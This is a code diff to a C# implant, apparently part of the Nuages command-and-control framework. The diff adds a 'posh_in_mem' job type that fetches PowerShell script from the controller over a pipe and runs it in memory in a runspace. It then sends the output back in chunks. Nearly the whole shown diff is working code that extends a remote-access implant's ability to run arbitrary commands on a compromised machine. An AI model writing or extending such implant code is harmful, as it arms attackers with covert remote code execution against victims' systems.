@@ -3,6 +3,10 @@ using System.Collections.Generic;
 using System.IO;
 using System.Net;
 using Newtonsoft.Json.Linq;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Text;
+using System.Collections.ObjectModel;
 
 namespace NuagesSharpImplant
 {
@@ -21,6 +25,8 @@ namespace NuagesSharpImplant
         void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream);
 
         void Stream2Pipe(string pipe_id, Stream stream);
+
+        byte[] PipeRead(string pipe_id, int BytesWanted);
 
     }
 
@@ -279,7 +285,7 @@ namespace NuagesSharpImplant
 
             this.connectionString = connector.getConnectionString();
 
-            this.supportedPayloads = new string[6];
+            this.supportedPayloads = new string[7];
 
             this.supportedPayloads[0] = "command";
 
@@ -292,6 +298,8 @@ namespace NuagesSharpImplant
             this.supportedPayloads[4] = "configure";
 
             this.supportedPayloads[5] = "cd";
+
+            this.supportedPayloads[6] = "posh_in_mem";
 
             this.handler = connector.getHandler();
 
@@ -318,6 +326,34 @@ namespace NuagesSharpImplant
             this.jobs = this.connector.Heartbeat(this.config["id"]);
         }
 
+        public string posh(string cmd)
+        {
+            try
+            {
+                Runspace runspace = RunspaceFactory.CreateRunspace();
+                runspace.Open();
+                Pipeline pipeline = runspace.CreatePipeline();
+                pipeline.Commands.AddScript(cmd);
+                pipeline.Commands.Add("Out-String");
+                Collection<PSObject> results = pipeline.Invoke();
+                StringBuilder stringBuilder = new StringBuilder();
+                foreach (PSObject obj in results)
+                {
+                    foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
+                    {
+                        stringBuilder.AppendLine(line.TrimEnd());
+                    }
+                }
+                runspace.Close();
+                return stringBuilder.ToString();
+            }
+            catch (Exception e)
+            {
+                string errorText = e.Message + "\n";
+                return (errorText);
+            }
+        }
+       
         public void ExecuteJob(JObject job)
         {
             string jobId = job.GetValue("_id").ToString();
@@ -429,6 +465,49 @@ namespace NuagesSharpImplant
                         result = fs.Name;
                     }
                     SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
+                }else if(jobType == "posh_in_mem")
+                {
+                    string command = job.SelectToken("payload.options.command").ToString();
+                    string path = ".";
+                    string pipe_id;
+                    string script;
+                    int length = 0;
+                    try
+                    {
+                        length = job.SelectToken("payload.options.length").ToObject<int>();
+                        pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                    }
+                    catch {
+                        pipe_id = "";
+                    }
+                    try
+                    {
+                        path = job.SelectToken("payload.options.path").ToString();
+                    }
+                    catch { }
+                    Directory.SetCurrentDirectory(path);
+                    if (pipe_id != "")
+                    {
+                        byte[] buffer = this.connector.PipeRead(pipe_id, length);
+                        script = Encoding.ASCII.GetString(buffer, 0, buffer.Length);
+                    }
+                    else {
+                        script = "";
+                    }
+                    script += "\r\n" + command;
+                    string result = this.posh(script);
+                    int maxrequestsize = 5000;
+                    try
+                    {
+                        maxrequestsize = Int32.Parse(this.config["maxrequestsize"]);
+                    }
+                    catch { }
+                    int n;
+                    for (n = 0; (n + 1) * maxrequestsize < result.Length; n++)
+                    {
+                        this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, maxrequestsize), moreData: true, error: false, n: n);
+                    }
+                    this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: false, n: n);
                 }
                 else
                 {
